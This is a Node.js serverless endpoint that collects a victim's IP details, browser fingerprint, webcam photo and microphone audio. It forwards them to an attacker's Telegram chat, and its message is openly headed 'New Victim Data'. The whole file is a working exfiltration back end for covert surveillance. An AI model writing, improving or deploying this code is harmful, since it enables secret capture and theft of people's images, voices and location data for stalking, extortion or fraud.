// api/telegram.js – Native fetch + FormData, zero external dependencies

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
        console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
        return res.status(500).json({
            error: 'Server misconfigured: missing token or chat ID',
            tokenExists: !!token,
            chatIdExists: !!chatId
        });
    }

    const body = req.body;
    if (!body) {
        return res.status(400).json({ error: 'Missing request body' });
    }

    const { ipData, fingerprint, webcam, mic, timestamp } = body;
    console.log(`[+] Received at ${timestamp}`);
    console.log(`[+] IP: ${ipData?.ip || 'N/A'}`);
    console.log(`[+] Webcam: ${webcam ? 'yes' : 'no'}`);
    console.log(`[+] Mic: ${mic ? 'yes' : 'no'}`);

    async function sendToTelegram(method, payload) {
        const url = `https://api.telegram.org/bot${token}/${method}`;
        try {
            const response = await fetch(url, payload);
            const data = await response.json();
            if (!response.ok) {
                console.error(`❌ Telegram ${method} failed:`, data);
                return { success: false, error: data };
            }
            console.log(`✅ Telegram ${method} succeeded.`);
            return { success: true, data };
        } catch (e) {
            console.error(`❌ Network error in ${method}:`, e.message);
            return { success: false, error: e.message };
        }
    }

    const results = {};

    // 1. Text message
    let message = '📡 *New Victim Data*\n\n';
    message += `*IP Info:*\n${JSON.stringify(ipData, null, 2)}\n\n`;
    message += `*Fingerprint:*\n${JSON.stringify(fingerprint, null, 2)}\n\n`;
    message += `*Timestamp:* ${timestamp}`;

    results.text = await sendToTelegram('sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        })
    });

    // 2. Webcam photo
    if (webcam) {
        try {
            const base64Data = webcam.split(',')[1];
            if (!base64Data) throw new Error('Invalid base64 data');
            const buffer = Buffer.from(base64Data, 'base64');
            const form = new FormData();
            form.append('chat_id', chatId);
            form.append('photo', buffer, { filename: 'webcam.jpg', contentType: 'image/jpeg' });

            results.photo = await sendToTelegram('sendPhoto', {
                method: 'POST',
                body: form
            });
        } catch (e) {
            results.photo = { success: false, error: e.message };
            console.error('❌ Photo processing error:', e.message);
        }
    } else {
        results.photo = { success: false, error: 'No webcam data' };
    }

    // 3. Microphone audio
    if (mic) {
        try {
            const base64Data = mic.split(',')[1];
            if (!base64Data) throw new Error('Invalid base64 data');
            const buffer = Buffer.from(base64Data, 'base64');
            const form = new FormData();
            form.append('chat_id', chatId);
            form.append('audio', buffer, { filename: 'mic.wav', contentType: 'audio/wav' });

            results.audio = await sendToTelegram('sendAudio', {
                method: 'POST',
                body: form
            });
        } catch (e) {
            results.audio = { success: false, error: e.message };
            console.error('❌ Audio processing error:', e.message);
        }
    } else {
        results.audio = { success: false, error: 'No mic data' };
    }

    const allSuccess = results.text.success && results.photo.success !== false && results.audio.success !== false;
    return res.status(allSuccess ? 200 : 207).json({
        success: allSuccess,
        results: results
    });
};